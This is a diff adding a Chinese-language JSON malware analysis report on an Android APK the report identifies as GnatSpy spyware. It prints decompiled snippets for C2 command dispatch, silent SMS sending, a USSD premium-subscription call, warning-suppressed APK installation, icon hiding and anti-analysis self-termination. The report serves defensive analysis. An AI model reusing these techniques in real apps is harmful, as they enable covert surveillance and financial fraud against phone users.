@@ -1,0 +1,265 @@
+{
+  "APK信息": {
+    "文件名": "6befd9dac5286f72516bba531371dc7769d9efecf56c8a44ce0c8de164662c6b.apk",
+    "sha256": "6befd9dac5286f72516bba531371dc7769d9efecf56c8a44ce0c8de164662c6b",
+    "包名": "com.app.go",
+    "应用名": "Android Setting",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 741.4
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "poll",
+          "report"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\b\\g;",
+          "method_signature": "switch(aVar.a)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "a aVar = this.c.get(i);\nl lVar = aVar.b;\nlVar.a(this.h, this.i);\nswitch (aVar.a) {\n    case 1:\n        lVar.a(aVar.c);\n        this.b.a(lVar, false);\n        break;\n    case 2:\n    default:\n        throw new IllegalArgumentException(\"Unknown cmd: \" + aVar.a);\n    case 3:\n        lVar.a(aVar.d);\n        this.b.g(lVar);\n        break;\n    case 4:\n        lVar.a(aVar.d);\n        this.b.h(lVar);\n        break;\n    case 5:\n        lVar.a(aVar.c);",
+          "malicious_code_snippet_context": "      void a() {\n          int size = this.c.size();\n          for (int i = 0; i < size; i++) {\n>>>             a aVar = this.c.get(i);\n>>>             l lVar = aVar.b;\n>>>             lVar.a(this.h, this.i);\n>>>             switch (aVar.a) {\n>>>                 case 1:\n>>>                     lVar.a(aVar.c);\n>>>                     this.b.a(lVar, false);\n>>>                     break;\n>>>                 case 2:\n>>>                 default:\n>>>                     throw new IllegalArgumentException(\"Unknown cmd: \" + aVar.a);\n>>>                 case 3:\n>>>                     lVar.a(aVar.d);\n>>>                     this.b.g(lVar);\n>>>                     break;\n>>>                 case 4:\n>>>                     lVar.a(aVar.d);\n>>>                     this.b.h(lVar);\n>>>                     break;\n>>>                 case 5:\n>>>                     lVar.a(aVar.c);\n                      this.b.i(lVar);\n                      break;\n                  case 6:",
+          "behavior_description": "该代码是典型的C2远程命令分发器：从命令队列(this.c)中取出指令对象aVar，根据指令编号(aVar.a)通过switch-case将指令携带的参数(aVar.c/aVar.d)分发给连接对象lVar及调度器this.b执行对应的本地操作（如a/g/h等不同动作），无法识别的指令抛出'Unknown cmd'异常。数据流向为：C2服务器下发指令→命令队列缓存→switch分发→本地执行远程控制操作。该模式与厂商报告确认的GnatSpy（APT-C-23/VAMP变种间谍软件）远程控制架构一致，且代码伪装在android.support.v4系统支持包路径下以规避检测，属于远程控制通道的核心命令处理循环。 [未经交叉验证]",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\receivers\\AmMcandMesReceiver;",
+          "method_signature": "a(String str, String str2, Context context)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);",
+          "malicious_code_snippet_context": "  \n      public void a(String str, String str2, Context context) {\n          try {\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, null, null);\n              Toast.makeText(context, \"Message Sent\", 1).show();\n          } catch (Exception e) {\n              Toast.makeText(context, e.getMessage().toString(), 1).show();",
+          "behavior_description": "该方法位于 BroadcastReceiver（AmMcandMesReceiver）中，接收目标号码 str 和短信内容 str2 作为参数，调用 SmsManager.getDefault().sendTextMessage() 在无用户感知、无用户确认的情况下静默发送短信（PendingIntent 均为 null，不产生任何发送回执界面）。结合该样本为 GnatSpy（APT-C-23/VAMP 变种）间谍软件，该方法通常由 onReceive 接收到的远程指令（C2 命令或控制短信）触发调用，实现攻击者远程操控受害手机向任意号码发送短信，可用于短信欺诈、订阅高额扣费业务或向联系人传播含恶意链接的短信，直接造成用户资费损失并扩散恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\services\\AlteService;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    this.a = a.a(this);\n    if (com.app.go.c.a.b(this)) {\n        this.b = (NotificationManager) getSystemService(\"notification\");\n        if (intent.getAction().equals(com.app.go.app.a.InterfaceC0024a.b)) {\n            String strA = this.a.a(\"gen_update_type\");\n            if (strA.equals(\"fb\")) {\n                a();\n                g.e(getApplicationContext());\n            } else if (strA.equals(\"wh\")) {\n                b();\n                g.e(getApplicationContext());\n            } else if (strA.equals(\"pl\")) { ... }",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         Log.d(this.c, \"onStartCommand ...\");\n>>>         this.a = a.a(this);\n>>>         if (com.app.go.c.a.b(this)) {\n>>>             this.b = (NotificationManager) getSystemService(\"notification\");\n>>>             if (intent.getAction().equals(com.app.go.app.a.InterfaceC0024a.b)) {\n>>>                 Log.d(this.c, \"Received Start Intent ACTION STARTFOREGROUND ACTION\");\n>>>                 String strA = this.a.a(\"gen_update_type\");\n>>>                 if (strA.equals(\"fb\")) {\n>>>                     Log.d(this.c, \"UPDATE_TYPE:\" + strA);\n>>>                     a();\n>>>                     g.e(getApplicationContext());\n>>>                 } else if (strA.equals(\"wh\")) {\n                      Log.d(this.c, \"UPDATE_TYPE:\" + strA);\n                      b();\n                      g.e(getApplicationContext());",
+          "behavior_description": "该代码位于 GnatSpy（APT-C-23 间谍软件变种）的核心服务 AlteService 中。onStartCommand 收到 STARTFOREGROUND action 后将服务提升为前台服务实现进程保活，防止系统回收；随后从本地配置读取 gen_update_type（该配置可被 C2 远程指令修改），按配置值（fb/wh/pl 等）分发执行不同的更新/加载逻辑 a()/b() 并调用 g.e() 执行后续操作。数据流向：SharedPreferences 中远程可控的配置项 gen_update_type → 前台服务保活 + 命令分发执行。该前台服务是间谍软件的持久化基石，确保恶意进程持续存活以维持 C2 连接并持续窃取短信、联系人、通话记录、图片等隐私数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.UNINSTALL_PACKAGE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\activities\\DialogFActivity;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 24)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "File fileB = b();\nif (Build.VERSION.SDK_INT < 24) {\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(fileB), \"application/vnd.android.package-archive\");\n    intent.setFlags(268435456);\n    startActivity(intent);\n    return;\n}\nUri uriA = h.a(getBaseContext(), getApplicationContext().getPackageName() + \".provider\", fileB);\nIntent intent2 = new Intent(\"android.intent.action.VIEW\", uriA);\nintent2.putExtra(\"android.intent.extra.NOT_UNKNOWN_SOURCE\", true);\nintent2.setDataAndType(uriA, \"application/vnd.android.package-archive\");\nintent2.setFlags(268468224);\nintent2.addFlags(1);",
+          "malicious_code_snippet_context": "      private a d;\n  \n      private void a() {\n>>>         File fileB = b();\n>>>         if (Build.VERSION.SDK_INT < 24) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(fileB), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             startActivity(intent);\n>>>             return;\n>>>         }\n>>>         Uri uriA = h.a(getBaseContext(), getApplicationContext().getPackageName() + \".provider\", fileB);\n>>>         Intent intent2 = new Intent(\"android.intent.action.VIEW\", uriA);\n>>>         intent2.putExtra(\"android.intent.extra.NOT_UNKNOWN_SOURCE\", true);\n>>>         intent2.setDataAndType(uriA, \"application/vnd.android.package-archive\");\n>>>         intent2.setFlags(268468224);\n>>>         intent2.addFlags(1);\n          startActivity(intent2);\n      }\n  ",
+          "behavior_description": "该代码是GnatSpy间谍木马（APT-C-23/Two-tailed Scorpion）的自我更新与载荷投放组件。数据流向：从本地存储获取APK文件（b()方法返回，通常为从C2服务器下载的恶意更新包）→ 通过ACTION_VIEW Intent并以application/vnd.android.package-archive MIME类型调起系统包安装器安装该APK。代码针对Android版本做了适配：SDK<24时直接使用file:// URI；SDK>=24时通过FileProvider获取content:// URI以绕过StrictMode限制。关键恶意特征是设置android.intent.extra.NOT_UNKNOWN_SOURCE为true，用于抑制系统'未知来源'安全警告，结合伪装成系统更新对话框（DialogFActivity）的社会工程手段诱导用户确认安装，实现木马自我更新和二次恶意载荷投放，维持对受害设备的持续控制。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\app\\go\\activities\\UninstallDialogActivity;",
+          "method_signature": "a()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.UNINSTALL_PACKAGE\");\nintent.setData(Uri.parse(\"package:\" + com.app.go.app.a.e));\nstartActivity(intent);",
+          "malicious_code_snippet_context": "      private a d;\n  \n      private void a() {\n>>>         Intent intent = new Intent(\"android.intent.action.UNINSTALL_PACKAGE\");\n>>>         intent.setData(Uri.parse(\"package:\" + com.app.go.app.a.e));\n>>>         startActivity(intent);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该代码位于已确认恶意样本 GnatSpy（APT-C-23/VAMP 变种）的 UninstallDialogActivity 中。方法 a() 构造 ACTION_UNINSTALL_PACKAGE 系统卸载 Intent，目标包名来自硬编码常量字段 com.app.go.app.a.e，通过 startActivity() 触发对指定应用的卸载流程。同时该 Activity 重写 onBackPressed() 为空实现，使用户无法通过返回键关闭弹窗，被迫面对卸载确认界面，形成强制操作场景。数据流向：硬编码包名常量 → Intent.setData(Uri.parse(\"package:\"+包名)) → startActivity() 触发系统卸载指定应用。结合该恶意家族已知行为，此功能用于移除设备上的目标应用（如竞争恶意软件家族或旧版本组件），实现攻击者对受害者设备应用生态的操控，属于恶意软件的应用卸载能力。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\receivers\\AmGNReceiver;",
+          "method_signature": "if(com.app.go.c.a.b(context)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent2 = new Intent(\"android.intent.action.CALL\");\nString str = \"*111*5*\" + this.a.a(\"get_number_from_user\") + \"#\";\nintent2.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(str))));\nif (android.support.v4.b.a.b(context, \"android.permission.CALL_PHONE\") != 0) {\n    return;\n}\ncontext.startActivity(intent2);",
+          "malicious_code_snippet_context": "              if (com.app.go.c.a.b(context)) {\n                  g.b(context, \"Operation Is: \" + lowerCase);\n              }\n>>>             Intent intent2 = new Intent(\"android.intent.action.CALL\");\n>>>             intent2.setFlags(268468224);\n>>>             String str = \"*111*5*\" + this.a.a(\"get_number_from_user\") + \"#\";\n>>>             Log.d(this.c, \"The Full Number: \" + str);\n>>>             intent2.setData(Uri.parse(String.format(\"tel:%s\", Uri.encode(str))));\n>>>             if (android.support.v4.b.a.b(context, \"android.permission.CALL_PHONE\") != 0) {\n>>>                 return;\n              }\n              context.startActivity(intent2);\n              return;",
+          "behavior_description": "该代码是 GnatSpy（APT-C-23/VAMP 变种）间谍软件的运营商定向欺诈模块。BroadcastReceiver 在收到广播后，先通过 TelephonyManager.getNetworkOperatorName() 检测受害者是否使用 Jawwal（巴勒斯坦运营商）网络，若是则从本地配置中读取攻击者预设的号码（get_number_from_user，通常由 C2 远程下发控制），拼接成 USSD 订购码 *111*5*[号码]#，随后使用 ACTION_CALL（区别于需要用户确认的 ACTION_DIAL，可直接静默发起呼叫）携带 tel: URI 启动拨号，在用户无感知的情况下执行 USSD 指令，为受害者订阅付费增值服务，造成直接经济损失。数据流向：配置文件中的攻击者控制参数（source）→ 拼接 USSD 码 → ACTION_CALL 静默拨号执行（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\activities\\fb_sign_up_Activity;",
+          "method_signature": "c()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(this.f, MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      public void c() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(this.f, (Class<?>) MainActivity.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 将应用的启动器组件 MainActivity 设置为禁用状态（参数2即 COMPONENT_ENABLED_STATE_DISABLED，参数1即 DONT_KILL_APP），使应用图标从桌面启动器中消失，用户无法找到并卸载该应用。数据流向：硬编码的 MainActivity 组件名→setComponentEnabledSetting() 静默禁用组件。结合厂商报告确认该样本为 GnatSpy（APT-C-23/VAMP 变种）间谍软件，且入口 Activity 伪装成 Facebook 注册页面（fb_sign_up_Activity）进行钓鱼，此图标隐藏行为是恶意软件在完成诱骗后实现隐蔽驻留、逃避用户察觉与卸载的关键对抗手段，为后续持续窃取短信、联系人、通话记录、图片等隐私数据创造条件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\app\\go\\receivers\\AmNogaReceiver;",
+          "method_signature": "if(!this.a.b(\"permissions_granted\")",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "低",
+          "malicious_code_snippet": "if (!this.a.b(\"permissions_granted\")) {\n    g.f(context, 0);\n    Process.killProcess(Process.myPid());\n} else {\n    g.a(context);\n    g.n(context, 10);\n    g.C(context, 1800);\n}",
+          "malicious_code_snippet_context": "          this.a = com.app.go.b.a.a(context);\n          Log.d(this.b, \"onReceive\");\n          if (com.app.go.c.a.b(context)) {\n>>>             if (!this.a.b(\"permissions_granted\")) {\n>>>                 g.f(context, 0);\n>>>                 Process.killProcess(Process.myPid());\n>>>             } else {\n>>>                 g.a(context);\n>>>                 g.n(context, 10);\n>>>                 g.C(context, 1800);\n>>>             }\n          }\n      }\n  }",
+          "behavior_description": "该代码位于 GnatSpy 间谍软件（APT-C-23/两尾蝎组织变种，厂商报告已确认）的广播接收器 AmNogaReceiver 中。onReceive 被触发时，程序读取内部权限标志位 permissions_granted（source）进行分支控制：若所需权限尚未全部授予，则先调用 g.f(context, 0)，随后立即通过 Process.killProcess(Process.myPid())（sink）杀死自身进程，使恶意样本在权限不足或沙箱动态分析环境下主动终止、保持静默以规避检测；若权限已全部授予，则通过 g.a/g.n/g.C 延迟拉起间谍组件（疑似启动恶意服务实现持久化驻留）。这种条件式自毁进程终止是恶意软件典型的反分析/隐蔽激活策略，属于该间谍软件控制逻辑的组成部分，本身不直接窃取数据，但为后续间谍行为提供隐蔽运行保障。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
